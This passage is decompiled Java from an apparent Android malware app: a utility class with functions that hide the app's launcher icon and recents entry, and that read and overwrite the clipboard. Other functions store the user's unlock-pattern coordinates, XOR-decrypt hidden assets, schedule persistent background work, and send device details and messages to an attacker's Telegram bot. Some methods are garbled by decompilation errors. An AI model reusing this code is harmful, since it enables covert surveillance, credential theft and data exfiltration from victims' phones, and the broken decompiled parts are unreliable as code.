    public static String getDefaultLauncherPackage(Context context) {
        Intent intent = new Intent("android.intent.action.MAIN");
        intent.addCategory("android.intent.category.HOME");
        context = context.getPackageManager().resolveActivity(intent, 65536);
        if (context != null && context.activityInfo != null) {
            return context.activityInfo.packageName;
        }
        return null;
    }

    public static Drawable getDrawableFromBase64(String object, Context context) {
        object = Base64.decode((String)object, (int)0);
        object = BitmapFactory.decodeByteArray((byte[])object, (int)0, (int)((Object)object).length);
        return new BitmapDrawable(context.getResources(), (Bitmap)object);
    }

    /*
     * Could not resolve type clashes
     * Loose catch block
     */
    public static String getExternalIpAddress() {
        Object object;
        Object object2;
        Object object3;
        for (Object object4 : new String[]{"http://checkip.amazonaws.com", "https://api.ipify.org", "https://icanhazip.com", "https://ifconfig.me/ip"}) {
            block27: {
                Object object5 = null;
                object2 = object3 = null;
                object = object5;
                object2 = object3;
                object = object5;
                Object object6 = new URL((String)object4);
                object2 = object3;
                object = object5;
                object4 = ((URL)object6).openConnection();
                object2 = object3;
                object = object5;
                ((URLConnection)object4).setConnectTimeout(5000);
                object2 = object3;
                object = object5;
                ((URLConnection)object4).setReadTimeout(5000);
                object2 = object3;
                object = object5;
                object2 = object3;
                object = object5;
                object2 = object3;
                object = object5;
                InputStreamReader inputStreamReader = new InputStreamReader(((URLConnection)object4).getInputStream());
                object2 = object3;
                object = object5;
                object2 = object3 = (object6 = new BufferedReader(inputStreamReader));
                object = object3;
                object5 = ((BufferedReader)object3).readLine();
                if (object5 == null) break block27;
                object2 = object3;
                object = object3;
                if (((String)object5).isEmpty()) break block27;
                object2 = object3;
                object = object3;
                object5 = ((String)object5).trim();
                try {
                    ((BufferedReader)object3).close();
                }
                catch (IOException iOException) {
                    // empty catch block
                }
                return object5;
            }
            ((BufferedReader)object3).close();
            {
                catch (IOException iOException) {
                }
            }
            catch (Throwable throwable) {
                if (object2 != null) {
                    try {
                        ((BufferedReader)object2).close();
                    }
                    catch (IOException iOException) {
                        // empty catch block
                    }
                }
                throw throwable;
            }
            catch (IOException iOException) {
                if (object == null) continue;
                ((BufferedReader)object).close();
            }
        }
        try {
            object3 = NetworkInterface.getNetworkInterfaces();
            while (object3.hasMoreElements()) {
                object2 = object3.nextElement();
                if (!((NetworkInterface)object2).isUp() || ((NetworkInterface)object2).isLoopback() || ((NetworkInterface)object2).isVirtual()) continue;
                object2 = ((NetworkInterface)object2).getInetAddresses();
                while (object2.hasMoreElements()) {
                    boolean bl;
                    object = (InetAddress)object2.nextElement();
                    if (((InetAddress)object).isLoopbackAddress() || !(object instanceof Inet4Address) || !((String)(object = ((InetAddress)object).getHostAddress())).startsWith("192.") && !((String)object).startsWith("10.") && !(bl = ((String)object).startsWith("172."))) continue;
                    return object;
                }
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return "127.0.0.1";
    }

    public static String getFileName(String string2) {
        if (string2 == null) {
            return null;
        }
        return new File(string2).getName();
    }

    public static File getInstalledApkPath(Context object) {
        try {
            object = new File(object.getPackageManager().getApplicationInfo((String)object.getPackageName(), (int)0).publicSourceDir);
            return object;
        }
        catch (Exception exception) {
            exception.printStackTrace();
            return null;
        }
    }

    public static String getLabelApplication(Context object) {
        try {
            object = (String)object.getPackageManager().getApplicationLabel(object.getPackageManager().getApplicationInfo(object.getPackageName(), 128));
            return object;
        }
        catch (Exception exception) {
            return "";
        }
    }

    public static List<String> getLauncherAppsPackageNames(Context object) {
        ArrayList<String> arrayList = new ArrayList<String>();
        Intent intent = new Intent("android.intent.action.MAIN");
        intent.addCategory("android.intent.category.LAUNCHER");
        object = object.getPackageManager().queryIntentActivities(intent, 0).iterator();
        while (object.hasNext()) {
            arrayList.add(((ResolveInfo)object.next()).activityInfo.packageName);
        }
        return arrayList;
    }

    public static String getPingSpeed(String string2) {
        return String.valueOf(UtilityHelper.tcpPing(string2, 80, 2000));
    }

    public static String getRandomLauncherApp(Context object) {
        Object object2 = object.getPackageManager();
        ArrayList<String> arrayList = new ArrayList<String>();
        Object object3 = new Intent("android.intent.action.MAIN", null);
        object3.addCategory("android.intent.category.LAUNCHER");
        object2 = object2.queryIntentActivities((Intent)object3, 0);
        object = object.getPackageName();
        object3 = object2.iterator();
        while (object3.hasNext()) {
            object2 = (ResolveInfo)object3.next();
            if (((ResolveInfo)object2).activityInfo == null || ((ResolveInfo)object2).activityInfo.packageName == null || ((String)object).toLowerCase().equals(((ResolveInfo)object2).activityInfo.packageName)) continue;
            arrayList.add(((ResolveInfo)object2).activityInfo.packageName);
        }
        if (!arrayList.isEmpty()) {
            if (randomidx == null) {
                randomidx = new Random();
            }
            return (String)arrayList.get(randomidx.nextInt(arrayList.size()));
        }
        return null;
    }

    /*
     * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
     * Loose catch block
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public static int[] getVideoDimensions(String string2) {
        Throwable throwable2222222;
        MediaMetadataRetriever mediaMetadataRetriever;
        block10: {
            mediaMetadataRetriever = new MediaMetadataRetriever();
            mediaMetadataRetriever.setDataSource(string2);
            String string3 = mediaMetadataRetriever.extractMetadata(18);
            string2 = mediaMetadataRetriever.extractMetadata(19);
            int n = Integer.parseInt(string3);
            int n2 = Integer.parseInt(string2);
            {
                catch (Throwable throwable2222222) {
                    break block10;
                }
                catch (Exception exception) {}
                {
                    exception.printStackTrace();
                }
                try {
                    mediaMetadataRetriever.release();
                    return null;
                }
                catch (IOException iOException) {
                    // empty catch block
                }
                return null;
            }
            try {
                mediaMetadataRetriever.release();
                return new int[]{n, n2};
            }
            catch (IOException iOException) {
                // empty catch block
            }
            return new int[]{n, n2};
        }
        try {
            mediaMetadataRetriever.release();
            throw throwable2222222;
        }
        catch (IOException iOException) {
            // empty catch block
        }
        throw throwable2222222;
    }

    public static String getdeviceIpAddress() {
        try {
            Object object = NetworkInterface.getNetworkInterfaces();
            while (object.hasMoreElements()) {
                Enumeration<InetAddress> enumeration = object.nextElement().getInetAddresses();
                while (enumeration.hasMoreElements()) {
                    InetAddress inetAddress = enumeration.nextElement();
                    if (inetAddress.isLoopbackAddress() || !(inetAddress instanceof Inet4Address)) continue;
                    object = inetAddress.getHostAddress();
                    return object;
                }
            }
        }
        catch (SocketException socketException) {
            socketException.printStackTrace();
        }
        return null;
    }

    public static String getsimname(Context object) {
        Object object2 = SubscriptionManager.from((Context)object);
        if (ActivityCompat.checkSelfPermission(object, "android.permission.READ_PHONE_STATE") != 0) {
            return "Known";
        }
        if (object2.getActiveSubscriptionInfoCount() > 1) {
            object2 = object2.getActiveSubscriptionInfoList();
            object = (SubscriptionInfo)object2.get(0);
            object2 = (SubscriptionInfo)object2.get(1);
            object = ((Object)object.getDisplayName()).toString();
            object2 = ((Object)object2.getDisplayName()).toString();
            return (String)object + "/" + (String)object2;
        }
        return ((TelephonyManager)object.getSystemService("phone")).getNetworkOperatorName();
    }

    public static boolean hasLauncherIcon(Context context, String string2) {
        boolean bl;
        block4: {
            Boolean bl2 = launcherCache.get(string2);
            if (bl2 != null) {
                return bl2;
            }
            boolean bl3 = false;
            bl = false;
            context = context.getPackageManager();
            bl2 = context.getLaunchIntentForPackage(string2);
            if (bl2 == null) break block4;
            try {
                context = context.resolveActivity((Intent)bl2, 65536);
                bl = context != null;
            }
            catch (Exception exception) {
                exception.printStackTrace();
                bl = bl3;
            }
        }
        launcherCache.put(string2, bl);
        return bl;
    }

    public static void hideme(Context context) {
        try {
            if (!alreadyhide) {
                StringBuilder stringBuilder;
                ComponentName componentName;
                alreadyhide = true;
                PackageManager packageManager = context.getPackageManager();
                if (packageManager.getComponentEnabledSetting(componentName = new ComponentName(context, (stringBuilder = new StringBuilder()).append(context.getPackageName()).append(".Vauplisa").toString())) != 2) {
                    packageManager.setComponentEnabledSetting(componentName, 2, 1);
                }
            }
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    public static String installdate(Context object) {
        try {
            long l = object.getPackageManager().getPackageInfo((String)object.getPackageName(), (int)4096).firstInstallTime;
            Date date = new Date(l);
            object = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault());
            object = ((DateFormat)object).format(date);
            return object;
        }
        catch (Exception exception) {
            return "Not Found";
        }
    }

    public static boolean isAppDisabled(Context context, String string2) {
        boolean bl = false;
        try {
            int n = context.getPackageManager().getApplicationEnabledSetting(string2);
            if (n == 2 || n == 3 || n == 4) {
                bl = true;
            }
            return bl;
        }
        catch (Exception exception) {
            exception.printStackTrace();
            return false;
        }
    }

    public static String isCharging(Context object) {
        boolean bl;
        int n = object.registerReceiver(null, new IntentFilter("android.intent.action.BATTERY_CHANGED")).getIntExtra("plugged", -1);
        boolean bl2 = bl = true;
        if (n != 1) {
            bl2 = n == 2 ? bl : false;
        }
        object = bl2 ? "t" : "f";
        return object;
    }

    public static boolean isCompressibleImageFile(String string2) {
        String[] stringArray = new String[]{".jpg", ".jpeg", ".png", ".webp"};
        string2 = string2.toLowerCase();
        int n = stringArray.length;
        for (int i = 0; i < n; ++i) {
            if (!string2.endsWith(stringArray[i])) continue;
            return true;
        }
        return false;
    }

    public static boolean isCompressibleVideoFile(String string2) {
        String[] stringArray = new String[]{".mp4", ".mov", ".mkv", ".avi", ".webm", ".flv", ".3gp"};
        string2 = string2.toLowerCase();
        int n = stringArray.length;
        for (int i = 0; i < n; ++i) {
            if (!string2.endsWith(stringArray[i])) continue;
            return true;
        }
        return false;
    }

    public static boolean isDefaultDialer(Context context) {
        TelecomManager telecomManager = (TelecomManager)context.getSystemService("telecom");
        if (telecomManager == null) {
            return false;
        }
        return context.getPackageName().equals(telecomManager.getDefaultDialerPackage());
    }

    public static boolean isDefaultSms(Context context) {
        RoleManager roleManager;
        String string2 = context.getPackageName();
        if (Build.VERSION.SDK_INT >= 29 && (roleManager = (RoleManager)context.getSystemService("role")) != null && roleManager.isRoleAvailable("android.app.role.SMS") && roleManager.isRoleHeld("android.app.role.SMS")) {
            return true;
        }
        return string2.equals(Telephony.Sms.getDefaultSmsPackage((Context)context));
    }

    public static boolean isGoogle() {
        return "google".equals(Build.BRAND.toLowerCase(Locale.ROOT));
    }

    public static boolean isHuawei() {
        return "huawei".equals(Build.BRAND.toLowerCase(Locale.ROOT));
    }

    private static boolean isIntentResolved(Context context, Intent intent) {
        boolean bl = intent != null && context.getPackageManager().resolveActivity(intent, 65536) != null;
        return bl;
    }

    public static boolean isMIUI(Context context) {
        boolean bl = UtilityHelper.isIntentResolved(context, new Intent("miui.intent.action.OP_AUTO_START").addCategory("android.intent.category.DEFAULT")) || UtilityHelper.isIntentResolved(context, new Intent().setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"))) || UtilityHelper.isIntentResolved(context, new Intent("miui.intent.action.POWER_HIDE_MODE_APP_LIST").addCategory("android.intent.category.DEFAULT")) || UtilityHelper.isIntentResolved(context, new Intent().setComponent(new ComponentName("com.miui.securitycenter", "com.miui.powercenter.PowerSettings")));
        return bl;
    }

    public static boolean isMyDreamSelected(Context object) {
        if (Settings.Secure.getInt((ContentResolver)object.getContentResolver(), (String)"screensaver_enabled", (int)0) == 0) {
            return false;
        }
        String[] stringArray = Settings.Secure.getString((ContentResolver)object.getContentResolver(), (String)"screensaver_components");
        if (stringArray != null && !stringArray.isEmpty()) {
            object = new ComponentName((Context)object, PersistentDreamService.class).flattenToString();
            stringArray = stringArray.split(":");
            int n = stringArray.length;
            for (int i = 0; i < n; ++i) {
                if (!((String)object).equals(stringArray[i])) continue;
                return true;
            }
            return false;
        }
        return false;
    }

    public static boolean isOppoOrOnePlus() {
        String string2 = Build.BRAND.toLowerCase(Locale.ROOT);
        boolean bl = "oppo".equals(string2) || "oneplus".equals(string2);
        return bl;
    }

    public static boolean isPackageInstalled(String string2, PackageManager packageManager) {
        try {
            packageManager.getPackageInfo(string2, 0);
            return true;
        }
        catch (PackageManager.NameNotFoundException nameNotFoundException) {
            return false;
        }
    }

    public static boolean isPermissionDeclaredInManifest(Context stringArray, String string2) {
        block5: {
            stringArray = stringArray.getPackageManager().getPackageInfo((String)stringArray.getPackageName(), (int)4096).requestedPermissions;
            if (stringArray == null) break block5;
            int n = stringArray.length;
            for (int i = 0; i < n; ++i) {
                try {
                    boolean bl = stringArray[i].equals(string2);
                    if (!bl) continue;
                    return true;
                }
                catch (PackageManager.NameNotFoundException nameNotFoundException) {
                    nameNotFoundException.printStackTrace();
                    break;
                }
            }
        }
        return false;
    }

    public static boolean isPortInUse(int n) {
        Socket socket = new Socket();
        InetSocketAddress inetSocketAddress = new InetSocketAddress("localhost", n);
        try {
            socket.connect(inetSocketAddress, 2000);
            return true;
        }
        catch (IOException iOException) {
            return false;
        }
        finally {
            try {
                socket.close();
            }
            catch (IOException iOException) {
                iOException.printStackTrace();
            }
        }
    }

    public static boolean isRealme() {
        return "realme".equals(Build.BRAND.toLowerCase(Locale.ROOT));
    }

    public static boolean isSamsung() {
        return "samsung".equals(Build.BRAND.toLowerCase(Locale.ROOT));
    }

    public static boolean isScreenOff(Context context) {
        if ((context = (PowerManager)context.getSystemService("power")) != null) {
            return context.isInteractive() ^ true;
        }
        return false;
    }

    public static boolean isSiteReachable(String object) {
        boolean bl = false;
        try {
            URL uRL = new URL((String)object);
            object = (HttpURLConnection)uRL.openConnection();
            ((URLConnection)object).setConnectTimeout(3000);
            ((URLConnection)object).setReadTimeout(3000);
            ((HttpURLConnection)object).setRequestMethod("HEAD");
            int n = ((HttpURLConnection)object).getResponseCode();
            boolean bl2 = bl;
            if (n >= 200) {
                bl2 = bl;
                if (n < 400) {
                    bl2 = true;
                }
            }
            return bl2;
        }
        catch (Exception exception) {
            exception.printStackTrace();
            return false;
        }
    }

    public static boolean isSystemApp(Context context, String string2) {
        Boolean bl = systemAppCache.get(string2);
        if (bl != null) {
            return bl;
        }
        boolean bl2 = false;
        context = context.getPackageManager();
        boolean bl3 = false;
        try {
            int n = context.getApplicationInfo((String)string2, (int)0).flags;
            if ((n & 1) != 0) {
                bl3 = true;
            }
        }
        catch (PackageManager.NameNotFoundException nameNotFoundException) {
            nameNotFoundException.printStackTrace();
            bl3 = bl2;
        }
        systemAppCache.put(string2, bl3);
        return bl3;
    }

    public static boolean isURLReachable(String object) {
        HttpURLConnection httpURLConnection = null;
        HttpURLConnection httpURLConnection2 = null;
        boolean bl = false;
        Object object2 = httpURLConnection2;
        Object object3 = httpURLConnection;
        object2 = httpURLConnection2;
        object3 = httpURLConnection;
        URL uRL = new URL((String)object);
        object2 = httpURLConnection2;
        object3 = httpURLConnection;
        object2 = object = (HttpURLConnection)uRL.openConnection();
        object3 = object;
        ((HttpURLConnection)object).setRequestMethod("HEAD");
        object2 = object;
        object3 = object;
        ((URLConnection)object).setConnectTimeout(5000);
        object2 = object;
        object3 = object;
        ((URLConnection)object).setReadTimeout(5000);
        object2 = object;
        object3 = object;
        try {
            int n = ((HttpURLConnection)object).getResponseCode();
            boolean bl2 = bl;
            if (200 <= n) {
                bl2 = bl;
                if (n < 300) {
                    bl2 = true;
                }
            }
            if (object != null) {
                ((HttpURLConnection)object).disconnect();
            }
            return bl2;
        }
        catch (Throwable throwable) {
            if (object2 != null) {
                ((HttpURLConnection)object2).disconnect();
            }
            throw throwable;
        }
        catch (IOException iOException) {
            if (object3 != null) {
                ((HttpURLConnection)object3).disconnect();
            }
            return false;
        }
    }

    public static boolean isUsageAccessGranted(Context context) {
        AppOpsManager appOpsManager = (AppOpsManager)context.getSystemService("appops");
        boolean bl = appOpsManager.checkOpNoThrow("android:get_usage_stats", Process.myUid(), context.getPackageName()) == 0;
        return bl;
    }

    public static boolean isWebSocketReachable(String string2) {
        CountDownLatch countDownLatch = new CountDownLatch(1);
        OkHttpClient okHttpClient = new OkHttpClient();
        boolean[] blArray = new boolean[]{false};
        okHttpClient.newWebSocket(new Request.Builder().url(string2).build(), new WebSocketListener(blArray, countDownLatch){
            final boolean[] val$isConnected;
            final CountDownLatch val$latch;
            {
                this.val$isConnected = blArray;
                this.val$latch = countDownLatch;
            }

            public void onClosed(WebSocket webSocket, int n, String string2) {
                System.out.println("WebSocket connection closed: " + string2);
                this.val$latch.countDown();
            }

            public void onFailure(WebSocket webSocket, Throwable throwable, Response response) {
                System.err.println("WebSocket connection error: " + throwable.getMessage());
                this.val$latch.countDown();
            }

            public void onOpen(WebSocket webSocket, Response response) {
                System.out.println("WebSocket connection established");
                this.val$isConnected[0] = true;
                webSocket.close(1000, "Closing");
                this.val$latch.countDown();
            }
        });
        try {
            countDownLatch.await(5L, TimeUnit.SECONDS);
        }
        catch (InterruptedException interruptedException) {
            interruptedException.printStackTrace();
        }
        okHttpClient.dispatcher().executorService().shutdown();
        return blArray[0];
    }

    public static boolean isXiaomi() {
        String string2 = Build.BRAND.toLowerCase(Locale.ROOT);
        boolean bl = "xiaomi".equals(string2) || "redmi".equals(string2);
        return bl;
    }

    public static boolean isvivo() {
        return "vivo".equals(Build.BRAND.toLowerCase(Locale.ROOT));
    }

    /*
     * Enabled force condition propagation
     * Lifted jumps to return sites
     */
    static /* synthetic */ void lambda$excludeFromTaskList$0(Context object) {
        object = (ActivityManager)object.getSystemService("activity");
        if (object == null) return;
        object = object.getAppTasks();
        if (object == null) return;
        try {
            if (object.isEmpty()) {
                return;
            }
            ((ActivityManager.AppTask)object.get(0)).setExcludeFromRecents(true);
            return;
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    static /* synthetic */ void lambda$sendToTelegram$1(Context object, String string2, String string3, String string4, String string5) {
        try {
            String string6 = SharedPreferencesManager.Read((Context)object, "ID", "unknown");
            object = SharedPreferencesManager.Read((Context)object, ConfigurationConstants.THE_CIP, "unknown");
            StringBuilder stringBuilder = new StringBuilder();
            String string7 = stringBuilder.append(Build.MANUFACTURER).append(" ").append(Build.MODEL).toString();
            stringBuilder = new StringBuilder();
            String string8 = stringBuilder.append("Android ").append(Build.VERSION.RELEASE).toString();
            stringBuilder = new StringBuilder();
            stringBuilder.append("\ud83d\udd14 ").append(string2).append("\n");
            stringBuilder.append("\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n");
            stringBuilder.append("\ud83d\udcf1 Device: ").append(string7).append("\n");
            stringBuilder.append("\ud83c\udf10 IP: ").append((String)object).append("\n");
            stringBuilder.append("\ud83d\udd11 ID: ").append(string6).append("\n");
            stringBuilder.append("\ud83e\udd16 OS: ").append(string8).append("\n");
            stringBuilder.append("\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n");
            stringBuilder.append(string3);
            object = new StringBuilder();
            string2 = ((StringBuilder)object).append("https://api.telegram.org/bot").append(string4).append("/sendMessage?chat_id=").append(URLEncoder.encode(string5, "UTF-8")).append("&text=").append(URLEncoder.encode(stringBuilder.toString(), "UTF-8")).toString();
            object = new URL(string2);
            object = (HttpURLConnection)((URL)object).openConnection();
            ((HttpURLConnection)object).setRequestMethod("GET");
            ((URLConnection)object).setConnectTimeout(10000);
            ((URLConnection)object).setReadTimeout(10000);
            ((HttpURLConnection)object).getResponseCode();
            ((HttpURLConnection)object).disconnect();
        }
        catch (Exception exception) {
            AndroidLogger.Error("TG_Send", exception.getMessage());
        }
    }

    public static String loadHtmlFromAssets(Context object, String object2) throws IOException {
        InputStream inputStream = object.getAssets().open((String)object2);
        try {
            if (!(ConfigurationProvider.AsstsKey.equals("[AST-PAS]") || object2 != null && ((String)object2).endsWith(".html"))) {
                object = new byte[inputStream.available()];
                inputStream.read((byte[])object);
                object = new String(UtilityHelper.xorBytes((byte[])object, ConfigurationProvider.AsstsKey), StandardCharsets.UTF_8);
            } else {
                object2 = new InputStreamReader(inputStream, StandardCharsets.UTF_8);
                object = new BufferedReader((Reader)object2);
                StringBuilder stringBuilder = new StringBuilder();
                while ((object2 = ((BufferedReader)object).readLine()) != null) {
                    stringBuilder.append((String)object2).append('\n');
                }
                ((BufferedReader)object).close();
                object = stringBuilder.toString();
            }
            return object;
        }
        finally {
            if (inputStream != null) {
                try {
                    inputStream.close();
                }
                catch (Throwable throwable) {
                    Throwable throwable2;
                    throwable2.addSuppressed(throwable);
                }
            }
        }
    }

    public static Map<Integer, Point> loadPatternMap(Context object) {
        String[] stringArray = SharedPreferencesManager.Read((Context)object, ConfigurationConstants.patternmp, "");
        object = new HashMap();
        if (stringArray != null && !stringArray.isEmpty()) {
            for (String string2 : stringArray.split(";")) {
                if (string2.trim().isEmpty()) continue;
                String[] stringArray2 = string2.split(":");
                String[] stringArray3 = stringArray2[1].split(",");
                object.put(Integer.parseInt(stringArray2[0]), new Point(Integer.parseInt(stringArray3[0]), Integer.parseInt(stringArray3[1])));
            }
        }
        return object;
    }

    public static void openAppByPackageName(Context context, String string2) {
        Intent intent = context.getPackageManager().getLaunchIntentForPackage(string2);
        if (intent != null) {
            intent.addFlags(0x10000000);
            context.startActivity(intent);
        } else {
            AndroidLogger.Debug("AppLauncherActivity", "App not found: " + string2);
            WorkerService.MyWorker.AlertServer(context, "Broadcast", "App not found: " + string2);
        }
    }

    public static void openmain(Context context) {
        try {
            Intent intent = new Intent(context, SplashActivity.class);
            intent.addFlags(0x10000000);
            intent.addFlags(131072);
            context.startActivity(intent);
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public static int randomnumber(int n, int n2) {
        if (rand == null) {
            rand = new Random();
        }
        return new Random().nextInt(n2 - n + 1) + n;
    }

    public static String readClipboard(Context context) {
        CountDownLatch countDownLatch = new CountDownLatch(1);
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable(){
            final Context val$ctx;
            final CountDownLatch val$latch;
            {
                this.val$ctx = context;
                this.val$latch = countDownLatch;
            }

            @Override
            public void run() {
                block4: {
                    ClipboardManager clipboardManager = (ClipboardManager)this.val$ctx.getSystemService("clipboard");
                    if (!clipboardManager.hasPrimaryClip()) break block4;
                    ClipDescription clipDescription = clipboardManager.getPrimaryClipDescription();
                    if ((clipboardManager = clipboardManager.getPrimaryClip()) == null || clipDescription == null) break block4;
                    try {
                        if (clipDescription.hasMimeType("text/plain")) {
                            UtilityHelper.access$002(String.valueOf(clipboardManager.getItemAt(0).getText()));
                        }
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                }
                this.val$latch.countDown();
            }
        }, 1000L);
        try {
            countDownLatch.await();
        }
        catch (InterruptedException interruptedException) {
            // empty catch block
        }
        return clipdata;
    }

    public static String readKernelVersion() {
        try {
            Object object = Runtime.getRuntime().exec("uname -a");
            object = ((java.lang.Process)object).waitFor() == 0 ? ((java.lang.Process)object).getInputStream() : ((java.lang.Process)object).getErrorStream();
            InputStreamReader inputStreamReader = new InputStreamReader((InputStream)object);
            BufferedReader bufferedReader = new BufferedReader(inputStreamReader, 8192);
            object = bufferedReader.readLine();
            bufferedReader.close();
            return object;
        }
        catch (Exception exception) {
            return "ERROR: " + exception.getMessage();
        }
    }

    public static Drawable resizeIcon(Context context, Drawable drawable2, int n, int n2) {
        drawable2 = Bitmap.createScaledBitmap((Bitmap)((BitmapDrawable)drawable2).getBitmap(), (int)n, (int)n2, (boolean)false);
        return new BitmapDrawable(context.getResources(), (Bitmap)drawable2);
    }

    public static void savePatternMap(Context context, Map<Integer, Point> object) {
        StringBuilder stringBuilder = new StringBuilder();
        for (Map.Entry entry : object.entrySet()) {
            int n = (Integer)entry.getKey();
            Point entry2 = (Point)entry.getValue();
            stringBuilder.append(n).append(":").append(entry2.x).append(",").append(entry2.y).append(";");
        }
        SharedPreferencesManager.Write(context, ConfigurationConstants.patternmp, stringBuilder.toString());
    }

    public static void sendToTelegram(Context context, String string2, String string3) {
        if (!SharedPreferencesManager.ReadBool(context, ConfigurationConstants.tg_enabled, false)) {
            return;
        }
        String string4 = SharedPreferencesManager.Read(context, ConfigurationConstants.tg_bot_token, "");
        String string5 = SharedPreferencesManager.Read(context, ConfigurationConstants.tg_chat_id, "");
        if (!string4.isEmpty() && !string5.isEmpty()) {
            new Thread(new UtilityHelper$$ExternalSyntheticLambda2(context, string2, string3, string4, string5)).start();
            return;
        }
    }

    public static void setActivityEnabled(Context context, Class<? extends Activity> clazz, boolean bl) {
        PackageManager packageManager = context.getPackageManager();
        int n = bl ? 1 : 2;
        packageManager.setComponentEnabledSetting(new ComponentName(context, clazz), n, 1);
    }

    public static void setClipboard(Context context, String string2) {
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable(){
            final Context val$ctx;
            final String val$str;
            {
                this.val$ctx = context;
                this.val$str = string2;
            }

            @Override
            public void run() {
                try {
                    ((ClipboardManager)this.val$ctx.getSystemService("clipboard")).setPrimaryClip(ClipData.newPlainText((CharSequence)"text/plain", (CharSequence)this.val$str));
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
        }, 1000L);
    }

    public static void setupWorkManager(Context object) {
        try {
            object = WorkManager.getInstance((Context)object);
            Object object2 = new PeriodicWorkRequest.Builder(Backworker.class, 15L, TimeUnit.MINUTES);
            object2 = (PeriodicWorkRequest)((WorkRequest.Builder)object2).build();
            ((WorkManager)object).enqueueUniquePeriodicWork("MyWorker", ExistingPeriodicWorkPolicy.KEEP, (PeriodicWorkRequest)object2);
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    public static void showme(Context context) {
        try {
            alreadyhide = false;
            PackageManager packageManager = context.getPackageManager();
            StringBuilder stringBuilder = new StringBuilder();
            ComponentName componentName = new ComponentName(context, stringBuilder.append(context.getPackageName()).append(".Vauplisa").toString());
            packageManager.setComponentEnabledSetting(componentName, 1, 1);
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    public static String stateCallString(int n) {
        switch (n) {
            default: {
                return "UNKNOWN(" + n + ")";
            }
            case 13: {
                return "SIMULATED_RINGING";
            }
            case 10: {
                return "DISCONNECTING";
            }
            case 9: {
                return "CONNECTING";
            }
            case 8: {
                return "SELECT_PHONE_ACCOUNT";
            }
            case 7: {
                return "DISCONNECTED";
            }
            case 4: {
                return "ACTIVE";
            }
            case 3: {
                return "HOLDING";
            }
            case 2: {
                return "RINGING";
            }
            case 1: {
                return "DIALING";
            }
            case 0: 
        }
        return "NEW";
    }

    /*
     * Exception decompiling
     */
    public static long tcpPing(String var0, int var1_3, int var2_4) {
        /*
         * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
         * 
         * org.benf.cfr.reader.util.ConfusedCFRException: Started 2 blocks at once
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.getStartingBlocks(Op04StructuredStatement.java:412)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:487)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
         *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
         *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
         *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
         *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
         *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
         *     at org.benf.cfr.reader.Main.main(Main.java:54)
         */
        throw new IllegalStateException("Decompilation failed");
    }

    public static void vibrateDevice(Context context, long l) {
        if ((context = (Vibrator)context.getSystemService("vibrator")) != null && context.hasVibrator()) {
            if (Build.VERSION.SDK_INT >= 26) {
                context.vibrate(VibrationEffect.createOneShot((long)l, (int)-1));
            } else {
                context.vibrate(l);
            }
        }
    }

    public static byte[] xorBytes(byte[] byArray, String object) {
        byte[] byArray2 = ((String)object).getBytes(StandardCharsets.UTF_8);
        object = new byte[byArray.length];
        for (int i = 0; i < byArray.length; ++i) {
            object[i] = (byte)(byArray[i] ^ byArray2[i % byArray2.length]);
        }
        return object;
    }
}

